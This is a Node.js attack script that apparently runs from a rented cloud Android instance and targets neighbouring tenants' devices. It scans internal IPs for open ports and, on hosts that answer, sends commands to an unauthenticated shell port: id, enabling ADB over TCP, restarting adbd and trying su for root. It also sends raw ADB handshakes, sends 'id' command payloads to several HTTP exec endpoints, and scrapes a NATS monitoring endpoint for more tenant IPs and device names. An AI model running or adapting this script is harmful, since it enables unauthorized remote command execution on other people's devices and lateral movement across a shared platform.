#!/usr/bin/env node
/**
 * NEIGHBOR DIRECT — Test each known IP individually for port 5555/11114/8779.
 * One syncCmd per IP. No loops. No timeouts.
 */

const path = require('path');
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');

const { AK, SK, HOST, SVC, D1, CT, SHD, sh, P } = require('../shared/vmos_api');
const OUT = path.join(__dirname, '..', 'output', 'n5555_results');

if (!fs.existsSync(OUT)) fs.mkdirSync(OUT, { recursive: true });
const save = (f, d) => fs.writeFileSync(`${OUT}/${f}`, typeof d === 'string' ? d : JSON.stringify(d, null, 2));

function sign(body) {
  const xd = new Date().toISOString().replace(/[-:]/g,'').replace(/\.\d{3}Z$/,'Z');
  const sd = xd.slice(0,8);
  const bh = crypto.createHash('sha256').update(body,'utf8').digest('hex');
  const can = [`host:${HOST}`,`x-date:${xd}`,`content-type:${CT}`,`signedHeaders:${SHD}`,`x-content-sha256:${bh}`].join('\n');
  const ch = crypto.createHash('sha256').update(can,'utf8').digest('hex');
  const sts = ['HMAC-SHA256',xd,`${sd}/${SVC}/request`,ch].join('\n');
  let k = crypto.createHmac('sha256',SK).update(sd).digest();
  k = crypto.createHmac('sha256',k).update(SVC).digest();
  k = crypto.createHmac('sha256',k).update('request').digest();
  return {'content-type':CT,'x-date':xd,'x-host':HOST,'authorization':`HMAC-SHA256 Credential=${AK}, SignedHeaders=${SHD}, Signature=${crypto.createHmac('sha256',k).update(sts).digest('hex')}`};
}

function post(ep, data, timeout) {
  return new Promise(ok => {
    const b = JSON.stringify(data||{}); const h = sign(b); const buf = Buffer.from(b);
    const req = https.request({hostname:HOST,path:ep,method:'POST',headers:{...h,'content-length':buf.length},timeout:(timeout||30)*1000},res=>{
      let d='';res.on('data',c=>d+=c);res.on('end',()=>{try{ok(JSON.parse(d));}catch{ok({code:-1,raw:d.slice(0,2000)});}});
    });
    req.on('timeout',()=>{req.destroy();ok({code:-99,msg:'timeout'});});
    req.on('error',e=>ok({code:-99,msg:e.message}));req.write(buf);req.end();
  });
}

// Test single IP on 3 ports — ultra short command
async function testIP(ip) {
  const r = await sh(D1, 
    `r=""; nc -w1 -z ${ip} 5555 2>/dev/null && r="$r 5555"; nc -w1 -z ${ip} 11114 2>/dev/null && r="$r 11114"; nc -w1 -z ${ip} 8779 2>/dev/null && r="$r 8779"; echo "${ip}:$r"`,
  10);
  return r;
}

async function main() {
  console.log('█'.repeat(75));
  console.log('  DIRECT NEIGHBOR PORT TEST — ONE IP AT A TIME');
  console.log('█'.repeat(75));

  // All candidate IPs from ARP table + NATS connz + wlan subnet
  const candidates = [
    // ARP neighbors (10.0.x.x)
    '10.0.96.65', '10.0.96.39', '10.0.96.139', '10.0.96.140',
    '10.0.97.220', '10.0.98.158', '10.0.98.171',
    '10.0.99.14', '10.0.99.43', '10.0.26.208',
    // NATS connz IPs (192.168.50.x)
    '192.168.50.239', '192.168.50.202', '192.168.50.249',
    // Wlan subnet neighbors
    '192.168.68.1', '192.168.68.2', '192.168.68.138', '192.168.68.140',
    // Our gateway
    '10.0.96.1', '10.0.96.2', '10.0.96.3',
  ];

  const openTargets = [];

  // Test each IP individually — no loops in shell
  for (const ip of candidates) {
    P(`Testing ${ip}...`);
    const result = await testIP(ip);
    P(`  ${result}`);
    
    const ports = [];
    if (result.includes('5555')) ports.push(5555);
    if (result.includes('11114')) ports.push(11114);
    if (result.includes('8779')) ports.push(8779);
    
    if (ports.length > 0) {
      P(`  ★ OPEN: ${ip} ports ${ports.join(', ')}`);
      openTargets.push({ ip, ports });
    }
  }

  save('direct_scan_results.json', openTargets);
  P(`\n  Total open targets: ${openTargets.length}`);

  // ═══════════════════════════════════════════════════════════
  // If we found open ports, try to access them
  // ═══════════════════════════════════════════════════════════
  if (openTargets.length > 0) {
    console.log('\n── ACCESSING OPEN TARGETS ──');

    for (const t of openTargets) {
      // Try shell port 11114
      if (t.ports.includes(11114)) {
        P(`\n[SHELL] ${t.ip}:11114 — sending commands...`);
        const id = await sh(D1, `echo "id" | nc -w2 ${t.ip} 11114 2>&1 | head -c 300`, 8);
        save(`shell_id_${t.ip.replace(/\./g,'_')}.txt`, id);
        P(`  id: ${id.slice(0,200)}`);

        const model = await sh(D1, `echo "getprop ro.product.model" | nc -w2 ${t.ip} 11114 2>&1 | head -c 200`, 8);
        P(`  model: ${model}`);

        // Enable ADB
        P(`  Enabling ADB 5555...`);
        await sh(D1, `echo "setprop service.adb.tcp.port 5555" | nc -w2 ${t.ip} 11114`, 8);
        await sh(D1, `echo "stop adbd; start adbd" | nc -w2 ${t.ip} 11114`, 8);
        const adbPort = await sh(D1, `echo "getprop service.adb.tcp.port" | nc -w2 ${t.ip} 11114 2>&1 | head -c 50`, 8);
        P(`  ADB port: ${adbPort}`);

        // Enable root
        P(`  Testing root...`);
        const root = await sh(D1, `echo "su -c id" | nc -w2 ${t.ip} 11114 2>&1 | head -c 200`, 8);
        P(`  root: ${root}`);

        save(`shell_access_${t.ip.replace(/\./g,'_')}.txt`, `id:${id}\nmodel:${model}\nadb:${adbPort}\nroot:${root}`);
      }

      // Try ADB port 5555
      if (t.ports.includes(5555)) {
        P(`\n[ADB] ${t.ip}:5555 — connecting...`);
        // Raw ADB protocol: CNXN message
        const adbRaw = await sh(D1, [
          `printf "CNXN\\x00\\x00\\x00\\x01\\x00\\x10\\x00\\x00\\x07\\x00\\x00\\x00\\x32\\x02\\x00\\x00\\xbc\\xb1\\xa7\\xb1host::\\x00" | nc -w3 ${t.ip} 5555 2>&1 | xxd | head -5`,
        ].join('; '), 10);
        save(`adb_raw_${t.ip.replace(/\./g,'_')}.txt`, adbRaw);
        P(`  ADB raw: ${adbRaw.slice(0,200)}`);
      }

      // Try agent HTTP 8779
      if (t.ports.includes(8779)) {
        P(`\n[AGENT] ${t.ip}:8779 — probing...`);
        const agentRoot = await sh(D1, `curl -s -m2 "http://${t.ip}:8779/" 2>/dev/null | head -c 300`, 8);
        save(`agent_root_${t.ip.replace(/\./g,'_')}.txt`, agentRoot);
        P(`  Root: ${agentRoot.slice(0,200)}`);

        // Try POST with command
        const agentCmd = await sh(D1, `curl -s -m3 -X POST "http://${t.ip}:8779/" -d '{"cmd":"id"}' -H "Content-Type:application/json" 2>/dev/null | head -c 300`, 8);
        P(`  POST /: ${agentCmd.slice(0,200)}`);

        // Try different endpoints
        const eps = await sh(D1, [
          `for ep in /shell /exec /cmd /run /api/shell /rpc /task; do`,
          `  r=$(curl -s -m1 -X POST "http://${t.ip}:8779$ep" -d '{"cmd":"id","command":"id","script":"id"}' -H "Content-Type:application/json" 2>/dev/null | head -c 100)`,
          `  echo "$ep: $r"`,
          `done`,
        ].join(' '), 15);
        save(`agent_eps_${t.ip.replace(/\./g,'_')}.txt`, eps);
        P(`  Endpoints:\n${eps}`);
      }
    }
  }

  // ═══════════════════════════════════════════════════════════
  // Also check: can we reach 192.168.50.x from here?
  // ═══════════════════════════════════════════════════════════
  console.log('\n── ROUTE CHECK ──');
  P('Checking if 192.168.50.x is routable...');
  const routeCheck = await sh(D1, 
    'ip route get 192.168.50.239 2>&1 | head -3',
  8);
  P(`  Route to 192.168.50.239: ${routeCheck}`);
  save('route_check.txt', routeCheck);

  // Try pinging a NATS IP
  const pingNats = await sh(D1, 'ping -c1 -W1 192.168.50.239 2>&1 | head -5', 8);
  P(`  Ping 192.168.50.239: ${pingNats}`);

  // Check wlan0 subnet
  P('Checking wlan0 subnet for neighbors...');
  const wlanPeers = await sh(D1, 'ip neigh show dev wlan0 2>/dev/null | head -10', 8);
  P(`  Wlan0 neighbors: ${wlanPeers}`);
  save('wlan_peers.txt', wlanPeers);

  // ═══════════════════════════════════════════════════════════
  // NATS connz — get more IPs with proper grep  
  // ═══════════════════════════════════════════════════════════
  console.log('\n── MORE NATS IPS ──');
  P('Getting more connz IPs (offset 200-1000)...');
  const moreIPs = await sh(D1,
    'curl -s -m10 "http://192.168.200.51:8222/connz?limit=100&offset=200" 2>/dev/null | sed -n \'s/.*"ip":"\\([^"]*\\)".*/\\1/p\' | sort -u | head -20',
  15);
  save('more_nats_ips.txt', moreIPs);
  P(`  More IPs:\n${moreIPs}`);

  // Get names (PAD codes) with IPs
  P('Getting connection names with IPs...');
  const namesIPs = await sh(D1,
    'curl -s -m10 "http://192.168.200.51:8222/connz?limit=10&offset=500" 2>/dev/null | sed -n \'s/.*"name":"\\([^"]*\\)".*/\\1/p\' | head -10',
  15);
  save('names_offset500.txt', namesIPs);
  P(`  Names:\n${namesIPs}`);

  // ═══════════════════════════════════════════════════════════
  // Try enabling ADB on our OWN device via API and connect locally
  // ═══════════════════════════════════════════════════════════
  console.log('\n── OWN DEVICE ADB CHECK ──');
  P('Our ADB status...');
  const ownAdb = await sh(D1, [
    'getprop service.adb.tcp.port',
    'getprop init.svc.adbd',
    'netstat -tlnp 2>/dev/null | grep 5555',
  ].join('; '), 8);
  P(`  Own ADB: ${ownAdb}`);

  // Enable ADB via API
  P('Enabling ADB via API...');
  const adbApi = await post('/vcpcloud/api/padApi/openOnlineAdb', {padCodes:[D1], open:1}, 15);
  P(`  API ADB enable: code=${adbApi.code}`);
  
  const adbInfo = await post('/vcpcloud/api/padApi/adb', {padCode:D1, enable:1}, 15);
  P(`  ADB info: code=${adbInfo.code}`);
  if (adbInfo.code === 200) {
    save('our_adb_info.json', adbInfo);
    P(`  ADB data: ${JSON.stringify(adbInfo.data).slice(0,300)}`);
  }

  // ═══════════════════════════════════════════════════════════
  // SUMMARY
  // ═══════════════════════════════════════════════════════════
  console.log('\n' + '█'.repeat(75));
  console.log('  RESULTS');
  console.log('█'.repeat(75));
  P(`  Open targets: ${openTargets.length}`);
  for (const t of openTargets) P(`    ${t.ip}: ${t.ports.join(', ')}`);
  
  const files = fs.readdirSync(OUT).sort();
  P(`  Result files: ${files.length}`);
}

main().catch(e => { console.error('FATAL:', e); process.exit(1); });
